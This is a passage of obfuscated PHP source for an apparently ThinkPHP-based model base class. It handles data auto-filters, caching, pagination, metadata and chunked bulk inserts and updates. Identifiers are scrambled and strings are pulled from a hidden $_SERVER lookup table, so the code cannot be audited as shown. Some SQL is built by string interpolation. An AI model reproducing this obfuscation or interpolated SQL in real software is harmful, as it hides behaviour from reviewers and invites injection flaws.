null) { $¹ëÑ´ÚÆ =& $_SERVER[€ä¾™²]; $this->options[$¹ëÑ´ÚÆ[429]] = is_null($ø—ı–±€) ? $»ÌäõŒï : $»ÌäõŒï . $¹ëÑ´ÚÆ[50] . $ø—ı–±€; return $this; } public function comment($õÙÄØÎÔ) { $this->options[$_SERVER[€ä¾™²][430]] = $õÙÄØÎÔ; return $this; } public function setProperty($«©à²èÁ, $Äş÷Õ‡ƒ) { if (property_exists($this, $«©à²èÁ)) { $this->{$«©à²èÁ} = $Äş÷Õ‡ƒ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\124\151\x6d\145", "\x74\x69\x6d\145", "\x69\x6e\163\145\x72\164\54\165\x70\x64\x61\164\145", "\146\165\156\x63\x74\151\x6f\x6e"), array("\143\x72\x65\x61\x74\x65\124\151\x6d\x65", "\164\x69\x6d\x65", "\151\156\x73\x65\x72\x74", "\x66\165\x6e\143\x74\151\x6f\156")); public function setDataAuto($Æ £ßå¶) { $this->dataAuto = $Æ £ßå¶; } public function __construct($‘ÓÊ‚¾£ = '', $Ñî¿øÂ€ = '', $“‡õØ—ò = '') { parent::__construct($‘ÓÊ‚¾£, $Ñî¿øÂ€, $“‡õØ—ò); } protected $tableMeta = array(); protected function _beforeInsert(&$ú­½…Ñ«, $ØŸ¦‡óŠ) { $ÁîÕ€î¥ =& $_SERVER[€ä¾™²]; if (!$this->checkDataAutoHas($ÁîÕ€î¥[431])) { return; } $this->dataBeforeFilter($ú­½…Ñ«, $ÁîÕ€î¥[431]); } protected function _beforeUpdate(&$çõ¥ş—ù, $ù³‰Å) { $ƒÁ¿”Ä =& $_SERVER[€ä¾™²]; if (!$this->checkDataAutoHas($ƒÁ¿”Ä[432])) { return; } $this->dataBeforeFilter($çõ¥ş—ù, $ƒÁ¿”Ä[432]); } protected function _afterSelect(&$ÀìÙÛ³÷, $Êßı“ú) { if (!is_array($ÀìÙÛ³÷)) { return; } if (!$this->checkDataAutoHas($_SERVER[€ä¾™²][433])) { return; } foreach ($ÀìÙÛ³÷ as &$ê‘½›˜) { $this->dataAfterFilter($ê‘½›˜); } unset($ê‘½›˜); } protected function _afterFind(&$÷Úãäİ¥, $èµÙäæ) { if (!is_array($÷Úãäİ¥)) { return; } if (!$this->checkDataAutoHas($_SERVER[€ä¾™²][433])) { return; } $this->dataAfterFilter($÷Úãäİ¥); } public static function textEncode($©åû×›Ÿ) { if (!$©åû×›Ÿ) { return $©åû×›Ÿ; } $Ÿâ´Æ = json_encode($©åû×›Ÿ); $Ÿâ´Æ = preg_replace_callback($_SERVER[€ä¾™²][434], function ($ëë¢«‹í) { return addslashes($ëë¢«‹í[0]); }, $Ÿâ´Æ); return json_decode($Ÿâ´Æ); } public static function textDecode($ùŠñÚÅË) { $ƒÓ×ş—É =& $_SERVER[€ä¾™²]; if (!$ùŠñÚÅË) { return $ùŠñÚÅË; } $òÅ‰¦‡Ñ = json_encode($ùŠñÚÅË); $òÅ‰¦‡Ñ = preg_replace_callback($ƒÓ×ş—É[435], function ($ëœØ‘¼Ë) { return $_SERVER[€ä¾™²][98]; }, $òÅ‰¦‡Ñ); return json_decode($òÅ‰¦‡Ñ); } public function setAutoIncrement($®ÚÊÔí™) { $îì–¤ç‹ = array($this->getPk() => $®ÚÊÔí™); $Ş§¹ààŒ = $this->data($îì–¤ç‹)->add(); if ($Ş§¹ààŒ) { $this->delete($Ş§¹ààŒ); } } public function getAutoIncrement() { $â°şúÕâ = $this->getTableName(); $—®ãÓå¨ = $this->max($this->getPk()); $Ëô‘ Ö = $this->query("\x73\x68\x6f\x77\40\164\141\142\154\145\x20\x73\164\141\x74\x75\x73\x20\x77\150\145\x72\145\x20\116\141\155\145\x3d\x27{$â°şúÕâ}\x27"); $…·ªêã° = $Ëô‘ Ö[0][$_SERVER[€ä¾™²][436]]; $ÔŒ²°ëå = max($—®ãÓå¨, $…·ªêã°); return $ÔŒ²°ëå; } protected function _callBefore($Ş¾ŞÈĞ¥, $ì³º¬Ù¡) { return $this->cacheCallCheck($Ş¾ŞÈĞ¥, $ì³º¬Ù¡, !1); } protected function _callAfter($àšø‹¶ã, $áªÏáş) { return $this->cacheCallCheck($àšø‹¶ã, $áªÏáş, !0); } protected function cacheFunctionAlias($¸½ˆ“•) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ü—€–§ö, $åÒ‡æ¤«, $–½¸£ÚŸ = false) { $†«Õœ©ê =& $_SERVER[€ä¾™²]; $õŸª¾¤Û = $this->cacheFunctionAlias($åÒ‡æ¤«); if (!$õŸª¾¤Û) { return; } foreach ($õŸª¾¤Û as $µò·šÉö => $·´¶äã§) { $Ûåâãº… = $·´¶äã§[0]; $–Îıó = explode($†«Õœ©ê[50], $·´¶äã§[1]); $€Ââôéá = isset($·´¶äã§[2]) ? $·´¶äã§[2] : $†«Õœ©ê[12]; if ($ü—€–§ö == $µò·šÉö) { return $this->cacheFunctionGet($µò·šÉö, $Ûåâãº…, $€Ââôéá); } if ($–½¸£ÚŸ && in_array($ü—€–§ö, $–Îıó)) { $this->cacheFunctionClear($µò·šÉö, $Ûåâãº…, $€Ââôéá); } } } public function cacheFunctionGet($¶›ˆ•Â, $áù¬Å›Î, $âùÏ¼åÌ = '') { $€ÎÁû×Ÿ =& $_SERVER[€ä¾™²]; $ƒòˆÔæ€ = $this->cacheKeyMake($¶›ˆ•Â, $áù¬Å›Î, $âùÏ¼åÌ); $ú¤§Äæ· = Cache::get($ƒòˆÔæ€); if (!is_array($ú¤§Äæ·)) { if (method_exists($this, $€ÎÁû×Ÿ[342] . $¶›ˆ•Â)) { $¶›ˆ•Â = $€ÎÁû×Ÿ[342] . $¶›ˆ•Â; } $ú¤§Äæ· = call_user_func_array(array($this, $¶›ˆ•Â), array($áù¬Å›Î, !0)); Cache::set($ƒòˆÔæ€, $ú¤§Äæ·); } return $ú¤§Äæ·; } public function cacheFunctionClear($ô…÷°Ù”, $‹ä¿·ïÁ, $²ÌÉ‰ = '') { $©²ââ•ä = $‹ä¿·ïÁ; if (!is_array($‹ä¿·ïÁ)) { $©²ââ•ä = array($‹ä¿·ïÁ); } foreach ($©²ââ•ä as $•¼‚ÖÕÙ) { $Èò×³å° = $this->cacheKeyMake($ô…÷°Ù”, $•¼‚ÖÕÙ, $²ÌÉ‰); Cache::remove($Èò×³å°); } } public function cacheKeyMake($éÈ™ËÇÃ, $§¬³«È¾, $ä„¨Ğïâ) { $ÆéëàŒ” =& $_SERVER[€ä¾™²]; if ($ä„¨Ğïâ) { $§¬³«È¾ = $§¬³«È¾ . $ÆéëàŒ”[437] . $ä„¨Ğïâ; } return get_class($this) . $ÆéëàŒ”[11] . $éÈ™ËÇÃ . $ÆéëàŒ”[438] . $§¬³«È¾; } protected function selectPageReset() { $ŒóƒÜÒ =& $_SERVER[€ä¾™²]; if (isset($GLOBALS[$ŒóƒÜÒ[439]])) { return; } $GLOBALS[$ŒóƒÜÒ[439]] = isset($GLOBALS[$ŒóƒÜÒ[7]][$ŒóƒÜÒ[440]]) ? $GLOBALS[$ŒóƒÜÒ[7]][$ŒóƒÜÒ[440]] : !1; $GLOBALS[$ŒóƒÜÒ[441]] = isset($GLOBALS[$ŒóƒÜÒ[7]][$ŒóƒÜÒ[429]]) ? $GLOBALS[$ŒóƒÜÒ[7]][$ŒóƒÜÒ[429]] : !1; $GLOBALS[$ŒóƒÜÒ[7]][$ŒóƒÜÒ[440]] = !1; $GLOBALS[$ŒóƒÜÒ[7]][$ŒóƒÜÒ[429]] = !1; } protected function selectPageRestore() { $åı±øü =& $_SERVER[€ä¾™²]; if (!isset($GLOBALS[$åı±øü[439]])) { return; } $GLOBALS[$åı±øü[7]][$åı±øü[440]] = $GLOBALS[$åı±øü[439]]; $GLOBALS[$åı±øü[7]][$åı±øü[429]] = $GLOBALS[$åı±øü[441]]; if ($GLOBALS[$åı±øü[7]][$åı±øü[440]] === !1) { unset($GLOBALS[$åı±øü[7]][$åı±øü[440]]); } if ($GLOBALS[$åı±øü[7]][$åı±øü[429]] === !1) { unset($GLOBALS[$åı±øü[7]][$åı±øü[429]]); } unset($GLOBALS[$åı±øü[439]]); unset($GLOBALS[$åı±øü[441]]); } protected function selectPage($€•å€êÖ = 200, $Ù–«ú¤ƒ = 1) { $İü¢ßéë =& $_SERVER[€ä¾™²]; global $in; $ƒíûØû = $this->optionsValue(); $®ä©‰ÈÂ = 50000; $€•å€êÖ = isset($in[$İü¢ßéë[440]]) && $in[$İü¢ßéë[440]] ? $in[$İü¢ßéë[440]] : $€•å€êÖ; if ($€•å€êÖ === -1) { $in[$İü¢ßéë[440]] = !1; $®ä©‰ÈÂ = 100000000; $€•å€êÖ = $®ä©‰ÈÂ; } $Û–—Ä = $ƒíûØû; $Û–—Ä[$İü¢ßéë[442]] = array(); $€•å€êÖ = intval($€•å€êÖ); $€•å€êÖ = $€•å€êÖ <= 5 ? 5 : ($€•å€êÖ >= $®ä©‰ÈÂ ? $®ä©‰ÈÂ : $€•å€êÖ); $Ù–«ú¤ƒ = intval(isset($in[$İü¢ßéë[429]]) && $in[$İü¢ßéë[429]] ? $in[$İü¢ßéë[429]] : $Ù–«ú¤ƒ); $Ù–«ú¤ƒ = $Ù–«ú¤ƒ <= 1 ? 1 : $Ù–«ú¤ƒ; $Õ÷Í©Ò = array(); $íõ®ùŠ = 1; if ($Ù–«ú¤ƒ == 1 && $íõ®ùŠ) { $this->optionsValue($ƒíûØû); $Õ÷Í©Ò = $this->page($Ù–«ú¤ƒ, $€•å€êÖ)->select(); $Ø–Ï»Ä÷ = is_array($Õ÷Í©Ò) ? count($Õ÷Í©Ò) : 0; if ($Ø–Ï»Ä÷ < $€•å€êÖ) { $ïÔÛÄ = 1; } else { $this->optionsValue($Û–—Ä); $Ø–Ï»Ä÷ = intval($this->count()); $ïÔÛÄ = ceil($Ø–Ï»Ä÷ / $€•å€êÖ); } } else { $this->optionsValue($Û–—Ä); $Ø–Ï»Ä÷ = intval($this->count()); $ïÔÛÄ = ceil($Ø–Ï»Ä÷ / $€•å€êÖ); $Ù–«ú¤ƒ = $Ù–«ú¤ƒ >= $ïÔÛÄ ? $ïÔÛÄ : $Ù–«ú¤ƒ; $this->optionsValue($ƒíûØû); $Õ÷Í©Ò = $this->page($Ù–«ú¤ƒ, $€•å€êÖ)->select(); } if (!is_array($Õ÷Í©Ò)) { $Õ÷Í©Ò = array(); } if ($ïÔÛÄ == 1) { $Ø–Ï»Ä÷ = count($Õ÷Í©Ò); } $ƒä½£õ = array($İü¢ßéë[443] => array($İü¢ßéë[444] => $Ø–Ï»Ä÷, $İü¢ßéë[440] => $€•å€êÖ, $İü¢ßéë[429] => $Ù–«ú¤ƒ, $İü¢ßéë[445] => $ïÔÛÄ), $İü¢ßéë[446] => $Õ÷Í©Ò); return $ƒä½£õ; } protected function checkLength($‡Ø×¶Ç’, $šşà‡±´ = 0, $Á÷·³æ° = '') { $Ñ™üÎÚ =& $_SERVER[€ä¾™²]; $šşà‡±´ = $šşà‡±´ ? $šşà‡±´ : 65536; if (!$‡Ø×¶Ç’ || strlen($‡Ø×¶Ç’) < $šşà‡±´) { return; } $Á÷·³æ° = $Á÷·³æ° ? $Á÷·³æ° . $Ñ™üÎÚ[74] : $Ñ™üÎÚ[12]; show_json($Á÷·³æ° . LNG($Ñ™üÎÚ[447]) . "\50{$šşà‡±´}\x29", !1); } protected function metaSet($•˜»©Ò‡, $­ƒ³ëÅ‘ = null, $·ºå’ = null) { $¼ƒ‚²· =& $_SERVER[€ä¾™²]; if (!$this->tableMeta || !$•˜»©Ò‡) { return !1; } $Èâøà’´ = $this->tableMeta[$¼ƒ‚²·[448]]; $¾Ã¼İ¹ = $this->tableMeta[$¼ƒ‚²·[449]]; $Ú‚ö™²ˆ = Model($¾Ã¼İ¹); $‡İœ»ÙÓ = array($Èâøà’´ => $•˜»©Ò‡, $¼ƒ‚²·[450] => $­ƒ³ëÅ‘); if (is_null($­ƒ³ëÅ‘)) { return $Ú‚ö™²ˆ->where(array($Èâøà’´ => $•˜»©Ò‡))->delete(); } if (is_null($·ºå’) && is_string($­ƒ³ëÅ‘)) { return $Ú‚ö™²ˆ->where($‡İœ»ÙÓ)->delete(); } $Äù”âü» = is_array($­ƒ³ëÅ‘) ? $­ƒ³ëÅ‘ : array(); if (is_string($­ƒ³ëÅ‘)) { $Äù”âü»[$­ƒ³ëÅ‘] = $·ºå’; } $±ˆÀ¶ = array(); foreach ($Äù”âü» as $ÒæÚÉú => $æ´†Æ˜Ğ) { if (is_null($æ´†Æ˜Ğ) && is_string($ÒæÚÉú)) { $Ú‚ö™²ˆ->where(array($Èâøà’´ => $•˜»©Ò‡, $¼ƒ‚²·[450] => $ÒæÚÉú))->delete(); continue; } $this->checkLength($æ´†Æ˜Ğ, !1, $¾Ã¼İ¹ . $¼ƒ‚²·[4] . $ÒæÚÉú); $±ˆÀ¶[] = array($Èâøà’´ => $•˜»©Ò‡, $¼ƒ‚²·[95] => $ÒæÚÉú, $¼ƒ‚²·[451] => $æ´†Æ˜Ğ); } $ğğ”öÇ¹ = $¼ƒ‚²·[452] . $¾Ã¼İ¹; CacheLock::lock($ğğ”öÇ¹); $Ú‚ö™²ˆ->where(array($Èâøà’´ => $•˜»©Ò‡))->addAll($±ˆÀ¶, array(), !0); CacheLock::unlock($ğğ”öÇ¹); return !0; } public function metaGet($ÜÊ´¾Í¥, $ššçù¬ƒ = false) { $™¨’‹À  =& $_SERVER[€ä¾™²]; if (!$this->tableMeta) { return array(); } $Ÿ•»€¡È = $this->tableMeta[$™¨’‹À [448]]; $…èÆÓŸ = Model($this->tableMeta[$™¨’‹À [449]]); if ($ššçù¬ƒ) { $£ÕäÚæ¹ = array($Ÿ•»€¡È => $ÜÊ´¾Í¥, $™¨’‹À [95] => $ššçù¬ƒ); return $…èÆÓŸ->where($£ÕäÚæ¹)->getField($™¨’‹À [451]); } $£ÕäÚæ¹ = array($Ÿ•»€¡È => $ÜÊ´¾Í¥); $Òà¹¾‹’ = $…èÆÓŸ->field($™¨’‹À [453])->where($£ÕäÚæ¹)->select(); $Òà¹¾‹’ = array_to_keyvalue($Òà¹¾‹’, $™¨’‹À [95], $™¨’‹À [451]); return $Òà¹¾‹’; } private function checkDataAutoHas($…ı¸ª”´) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ì˜ö’Î‹) { if (in_array($…ı¸ª”´, explode($_SERVER[€ä¾™²][50], $Ì˜ö’Î‹[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$üİ–á¤, $Á¡ÔİÎŞ) { $’áÍ¤ € =& $_SERVER[€ä¾™²]; if (!is_array($üİ–á¤)) { return; } foreach ($this->dataAuto as $ ½³˜²) { $ˆÏÕúÙ = $ ½³˜²[0]; if (!in_array($Á¡ÔİÎŞ, explode($’áÍ¤ €[50], $ ½³˜²[2]))) { continue; } switch (trim($ ½³˜²[3])) { case $’áÍ¤ €[397]: case $’áÍ¤ €[398]: $¸”µ¾äÒ = $ ½³˜²[1]; $é†¬İÂº = isset($ ½³˜²[4]) ? (array) $ ½³˜²[4] : array(); if ($¸”µ¾äÒ == $’áÍ¤ €[205] && array_key_exists($ˆÏÕúÙ, $üİ–á¤)) { if (!$üİ–á¤[$ˆÏÕúÙ]) { unset($üİ–á¤[$ˆÏÕúÙ]); } break; } if (isset($üİ–á¤[$ˆÏÕúÙ])) { array_unshift($é†¬İÂº, $üİ–á¤[$ˆÏÕúÙ]); } if ($’áÍ¤ €[397] == $ ½³˜²[3]) { $üİ–á¤[$ˆÏÕúÙ] = call_user_func_array($¸”µ¾äÒ, $é†¬İÂº); } else { $üİ–á¤[$ˆÏÕúÙ] = call_user_func_array(array(&$this, $¸”µ¾äÒ), $é†¬İÂº); } break; case $’áÍ¤ €[349]: if (isset($üİ–á¤[$ˆÏÕúÙ]) && $üİ–á¤[$ˆÏÕúÙ]) { $üİ–á¤[$ˆÏÕúÙ] = call_user_func_array(array(&$this, $ ½³˜²[1]), array($üİ–á¤[$ˆÏÕúÙ])); } break; case $’áÍ¤ €[352]: $üİ–á¤[$ˆÏÕúÙ] = $üİ–á¤[$ ½³˜²[1]]; break; case $’áÍ¤ €[370]: if (isset($üİ–á¤[$ˆÏÕúÙ]) && !is_string($üİ–á¤[$ˆÏÕúÙ])) { $üİ–á¤[$ˆÏÕúÙ] = json_encode_force($üİ–á¤[$ˆÏÕúÙ]); $üİ–á¤[$ˆÏÕúÙ] = self::textEncode($üİ–á¤[$ˆÏÕúÙ]); } break; case $’áÍ¤ €[399]: if ($üİ–á¤[$ˆÏÕúÙ] === $’áÍ¤ €[12]) { unset($üİ–á¤[$ˆÏÕúÙ]); } break; case $’áÍ¤ €[400]: $üİ–á¤[$ˆÏÕúÙ] = $ ½³˜²[1]; default: break; } } if ($Á¡ÔİÎŞ == $’áÍ¤ €[431]) { $­®ÈĞÌÂ = strtolower($this->db->getDbType()); if (strpos($­®ÈĞÌÂ, $’áÍ¤ €[13]) !== 0) { return; } $°ìÖ¡Ö = $this->field(!0)->fields; $ÈÍÃ®îà = $°ìÖ¡Ö[$’áÍ¤ €[330]]; if (isset($°ìÖ¡Ö[$’áÍ¤ €[329]])) { unset($ÈÍÃ®îà[$°ìÖ¡Ö[$’áÍ¤ €[329]]]); } foreach ($ÈÍÃ®îà as $ùë¶…¹® => $Á¡ÔİÎŞ) { if (!isset($üİ–á¤[$ùë¶…¹®])) { $üİ–á¤[$ùë¶…¹®] = $’áÍ¤ €[12]; } } } } private function dataAfterFilter(&$òÛÜóü) { $·ÖÒì²´ =& $_SERVER[€ä¾™²]; foreach ($this->dataAuto as $„úŸÎâ) { $ÏßØ‚°³ = $„úŸÎâ[0]; if (!isset($òÛÜóü[$ÏßØ‚°³])) { continue; } if (!in_array($·ÖÒì²´[433], explode($·ÖÒì²´[50], $„úŸÎâ[2]))) { continue; } switch (trim($„úŸÎâ[3])) { case $·ÖÒì²´[397]: case $·ÖÒì²´[398]: $¶éÁç¯¥ = isset($„úŸÎâ[4]) ? (array) $„úŸÎâ[4] : array(); array_unshift($¶éÁç¯¥, $òÛÜóü[$ÏßØ‚°³]); if (isset($„úŸÎâ[4]) && $„úŸÎâ[4] == $·ÖÒì²´[454]) { $¶éÁç¯¥ = array($òÛÜóü[$ÏßØ‚°³]); } if ($·ÖÒì²´[397] == $„úŸÎâ[3]) { $òÛÜóü[$ÏßØ‚°³] = call_user_func_array($„úŸÎâ[1], $¶éÁç¯¥); } else { $òÛÜóü[$ÏßØ‚°³] = call_user_func_array(array(&$this, $„úŸÎâ[1]), $¶éÁç¯¥); } break; case $·ÖÒì²´[349]: if (isset($òÛÜóü[$ÏßØ‚°³]) && $òÛÜóü[$ÏßØ‚°³]) { $òÛÜóü[$ÏßØ‚°³] = call_user_func_array(array(&$this, $„úŸÎâ[1]), array($òÛÜóü[$ÏßØ‚°³])); } break; case $·ÖÒì²´[352]: $òÛÜóü[$ÏßØ‚°³] = $òÛÜóü[$„úŸÎâ[1]]; break; case $·ÖÒì²´[370]: $±Êì€îõ = $òÛÜóü[$ÏßØ‚°³]; $±Êì€îõ = self::textDecode($±Êì€îõ); $òÛÜóü[$ÏßØ‚°³] = json_decode($±Êì€îõ, !0); if (is_null($òÛÜóü[$ÏßØ‚°³])) { $òÛÜóü[$ÏßØ‚°³] = $±Êì€îõ; } break; case $·ÖÒì²´[399]: if ($òÛÜóü[$ÏßØ‚°³] === $·ÖÒì²´[12]) { unset($òÛÜóü[$ÏßØ‚°³]); } break; case $·ÖÒì²´[400]: $òÛÜóü[$ÏßØ‚°³] = $„úŸÎâ[1]; break; default: break; } } } public function saveAll($äÙôÄ’Ñ, $Î˜æ¢•µ = false) { $¾ûœ¡¿ =& $_SERVER[€ä¾™²]; $Å»Êòù£ = $this->db; $ä»ï¡Î½ = $this->tablePrefix . $this->tableName; $È‰Çï¾º = $this->saveAllChunkMake($äÙôÄ’Ñ); $Î˜æ¢•µ = is_array($Î˜æ¢•µ) ? $Î˜æ¢•µ : array(); foreach ($È‰Çï¾º as $Õ³ÊÆ‚Š) { $ºïõàºö = $¾ûœ¡¿[12]; $ñü–òµı = $¾ûœ¡¿[12]; $‰‘ò‡ÌÜ = array(); $°©€ôúá = array(); foreach ($Õ³ÊÆ‚Š as $º—†ôâ° => $ÙÙ½Î€) { $ºïõàºö = $ÙÙ½Î€[$¾ûœ¡¿[455]]; $°©€ôúá[] = $ÙÙ½Î€[$¾ûœ¡¿[456]]; $ì¾™­Íú = $Å»Êòù£->parseValue($ÙÙ½Î€[$¾ûœ¡¿[456]]); foreach ($ÙÙ½Î€[$¾ûœ¡¿[457]] as $ïÕ©ï«ƒ => $˜ıëÁ¾ş) { if (!$‰‘ò‡ÌÜ[$ïÕ©ï«ƒ]) { $‰‘ò‡ÌÜ[$ïÕ©ï«ƒ] = array(); } $‰‘ò‡ÌÜ[$ïÕ©ï«ƒ][] = $¾ûœ¡¿[458] . $ì¾™­Íú . $¾ûœ¡¿[459] . $Å»Êòù£->parseValue($˜ıëÁ¾ş); } } $™º·­Ë = $ºïõàºö; $™º·­Ë = $Å»Êòù£->parseKey($™º·­Ë); foreach ($‰‘ò‡ÌÜ as $ïÕ©ï«ƒ => $–ÏÜïíô) { $ñü–òµı .= $¾ûœ¡¿[286] . $Å»Êòù£->parseKey($ïÕ©ï«ƒ) . $¾ûœ¡¿[460] . $™º·­Ë . $¾ûœ¡¿[461]; $ñü–òµı .= implode($¾ûœ¡¿[286], $–ÏÜïíô) . $¾ûœ¡¿[462]; } $Øµé¿üş = $Î˜æ¢•µ; $Øµé¿üş[$ºïõàºö] = array($¾ûœ¡¿[7], $°©€ôúá); $¼Ìñ÷¤¾ = "\x55\120\104\x41\124\105\x20\140{$ä»ï¡Î½}\x60\x20\x53\x45\x54\x20" . rtrim($ñü–òµı, $¾ûœ¡¿[50]) . $¾ûœ¡¿[286] . $Å»Êòù£->parseWhere($Øµé¿üş); $this->execute($¼Ìñ÷¤¾); $this->chunkEventCheck(count($Õ³ÊÆ‚Š)); } $this->chunkEventSet(); } public function saveAllEach($Ö—Å‰œ¢, $…˜ÓĞñ¢ = false) { $Ü¾íİ…é =& $_SERVER[€ä¾™²]; $äıŞ–Äš = $this->db; $Ó‘ÂˆãÉ = $this->tablePrefix . $this->tableName; $äèıÇßã = $this->saveAllChunkMake($Ö—Å‰œ¢); $…˜ÓĞñ¢ = is_array($…˜ÓĞñ¢) ? $…˜ÓĞñ¢ : array(); foreach ($äèıÇßã as $Ü¤Ÿäú) { foreach ($Ü¤Ÿäú as $œ¬õÄá => $‰Èèç§Î) { $¦Ë¸ƒ•ƒ = $Ü¾íİ…é[463]; foreach ($‰Èèç§Î[$Ü¾íİ…é[457]] as $ÅÔäŞ±² => $–å¿²‹Ï) { $¦Ë¸ƒ•ƒ .= $äıŞ–Äš->parseKey($ÅÔäŞ±²) . $Ü¾íİ…é[464] . $äıŞ–Äš->parseValue($–å¿²‹Ï) . $Ü¾íİ…é[50]; } $›šĞÏ— = $…˜ÓĞñ¢; $›šĞÏ—[$‰Èèç§Î[$Ü¾íİ…é[455]]] = $‰Èèç§Î[$Ü¾íİ…é[456]]; $§œèÊØ = "\125\x50\x44\101\x54\105\40\x60{$Ó‘ÂˆãÉ}\x60\40\x53\x45\124\40" . rtrim($¦Ë¸ƒ•ƒ, $Ü¾íİ…é[50]) . $Ü¾íİ…é[465] . $äıŞ–Äš->parseWhere($›šĞÏ—) . $Ü¾íİ…é[466]; $this->execute($§œèÊØ); } $this->chunkEventCheck(count($Ü¤Ÿäú)); } $this->chunkEventSet(); } private function saveAllChunkMake($ÜÏ¥å™ê) { $™ÀÁš˜Í =& $_SERVER[€ä¾™²]; $ˆ²ÖáÅÎ = self::SQL_WHERE_IN_CHUNK; $ÜÏ¥å™ê = is_array($ÜÏ¥å™ê) ? $ÜÏ¥å™ê : array(); $¡«ë‰ó = array(); $ß½Ûê»¢ = ceil(count($ÜÏ¥å™ê) / $ˆ²ÖáÅÎ); for ($ŠÊ©šÏ = 0; $ŠÊ©šÏ < $ß½Ûê»¢; $ŠÊ©šÏ++) { $Äî­Ò¯è = array(); $¬º¢¤©ª = array_slice($ÜÏ¥å™ê, $ŠÊ©šÏ * $ˆ²ÖáÅÎ, $ˆ²ÖáÅÎ); foreach ($¬º¢¤©ª as $‰´ãÓ´˜) { if (!is_array($‰´ãÓ´˜) || count($‰´ãÓ´˜) < 4 || count($‰´ãÓ´˜) % 2 != 0) { continue; } $ßü¢øöÁ = array(); for ($Úîùéì¤ = 2; $Úîùéì¤ < count($‰´ãÓ´˜); $Úîùéì¤ += 2) { $ßü¢øöÁ[$‰´ãÓ´˜[$Úîùéì¤]] = $‰´ãÓ´˜[$Úîùéì¤ + 1]; } $Äî­Ò¯è[] = array($™ÀÁš˜Í[455] => $‰´ãÓ´˜[0], $™ÀÁš˜Í[456] => $‰´ãÓ´˜[1], $™ÀÁš˜Í[457] => $ßü¢øöÁ); } $¡«ë‰ó[] = $Äî­Ò¯è; } return $¡«ë‰ó; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Â¹¨¼²¥ = false, $æµ²Ÿ¥ = false) { $this->_chunkEvent = $Â¹¨¼²¥; $this->_chunkEventParam = $æµ²Ÿ¥; } private function chunkEventCheck($«Ùèøû) { if (!$this->_chunkEvent) { return; } $¨´ğØø = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¨´ğØø[$_SERVER[€ä¾™²][467]] = $«Ùèøû; Hook::trigger($this->_chunkEvent, $¨´ğØø); } public function addAll($Ø¿²‚², $›»•ãí† = array(), $÷•Ê‘¢ = false) { $÷ó…Ú =& $_SERVER[€ä¾™²]; ignore_timeout(); $ĞœÖÚË = self::SQL_WHERE_IN_CHUNK; if (empty($Ø¿²‚²)) { $this->error = think_lang($÷ó…Ú[350]); return !1; } $›»•ãí† = $this->_parseOptions($›»•ãí†); foreach ($Ø¿²‚² as $·æ„ò => $„ïğéŒ¤) { $Ø¿²‚²[$·æ„ò] = $this->_facade($„ïğéŒ¤); $this->_beforeInsert($Ø¿²‚²[$·æ„ò], $›»•ãí†); } if (method_exists($this->db, $÷ó…Ú[351])) { for ($íî´üë = 0; $íî´üë < count($Ø¿²‚²); $íî´üë += $ĞœÖÚË) { $ß–ÃÉ¬š = array_slice($Ø¿²‚², $íî´üë, $ĞœÖÚË); if (!is_array($ß–ÃÉ¬š) || count($ß–ÃÉ¬š) == 0) { break; } $èÒæ›í = $this->db->insertAll($ß–ÃÉ¬š, $›»•ãí†, $÷•Ê‘¢); $this->chunkEventCheck(count($ß–ÃÉ¬š)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ø¿²‚² as $·æ„ò => $„ïğéŒ¤) { $èÒæ›í = $this->db->insert($„ïğéŒ¤, $›»•ãí†, $÷•Ê‘¢); } $this->commit(); } if (!1 !== $èÒæ›í) { $™’„ÌÁµ = $this->getLastInsID(); if ($™’„ÌÁµ) { return $™’„ÌÁµ; } } return $èÒæ›í; } public function save($¬”˜Ó¾Ä = '', $ìÀ³¶® = array()) { $öæ®ãÔ‚ =& $_SERVER[€ä¾™²]; $¹»ú¡ÓŞ = self::SQL_WHERE_IN_CHUNK; $óú¹ôøÈ = $this->optionsValue(); $¿¥«ÊØË = $this->findWhereField($óú¹ôøÈ); if (!$¿¥«ÊØË) { return parent::save($¬”˜Ó¾Ä, $ìÀ³¶®); } $ŞÛ“¸è = 0; $¿Í­ò”Ñ = $óú¹ôøÈ[$öæ®ãÔ‚[354]][$¿¥«ÊØË][1]; $¿Í­ò”Ñ = is_array($¿Í­ò”Ñ) ? $¿Í­ò”Ñ : array(); $áËıã¯Š = count($¿Í­ò”Ñ); for ($±ú›é¯€ = 0; $±ú›é¯€ < $áËıã¯Š; $±ú›é¯€ += $¹»ú¡ÓŞ) { $ıÜ¢¯üá = array_slice($¿Í­ò”Ñ, $±ú›é¯€, $¹»ú¡ÓŞ); if (!is_array($ıÜ¢¯üá) || count($ıÜ¢¯üá) == 0) { break; } $óú¹ôøÈ[$öæ®ãÔ‚[354]][$¿¥«ÊØË][1] = $ıÜ¢¯üá; $this->optionsValue($óú¹ôøÈ); $ŞÛ“¸è += parent::save($¬”˜Ó¾Ä, $ìÀ³¶®); $this->chunkEventCheck(count($ıÜ¢¯üá)); } $this->chunkEventSet(); return $ŞÛ“¸è; } public function add($Öëª”ˆ = '', $ë³ƒ±ƒ = array(), $÷ÔŞÍõÚ = false) { if ($this->addTaskStatus && is_array($Öëª”ˆ)) { $this->addTaskData[] = $Öëª”ˆ; return; } return parent::add($Öëª”ˆ, $ë³ƒ±ƒ, $÷ÔŞÍõÚ); } public function parseWhereLike($ÇŒƒõÄ, $ÈØ˜°… = '', $–·‘å‰ = false, &$øËÔò· = false) { $ƒÏÀÜÜ =& $_SERVER[€ä¾™²]; $¸ì¾•ù = $GLOBALS[$ƒÏÀÜÜ[6]][$ƒÏÀÜÜ[468]]; if (!$¸ì¾•ù[$ƒÏÀÜÜ[469]]) { return $ÇŒƒõÄ; } if (!in_array($this->tableName, array($ƒÏÀÜÜ[430], $ƒÏÀÜÜ[470], $ƒÏÀÜÜ[471], $ƒÏÀÜÜ[472]))) { return $ÇŒƒõÄ; } if (!is_array($ÇŒƒõÄ)) { return $ÇŒƒõÄ; } $²ë™Ôéé = array(); $Å¯Ì‰û“ = 0; foreach ($ÇŒƒõÄ as $“¾ØŒšÊ => $ùÊ¾Ğù½) { if (is_array($ùÊ¾Ğù½) && count($ùÊ¾Ğù½) == 2 && 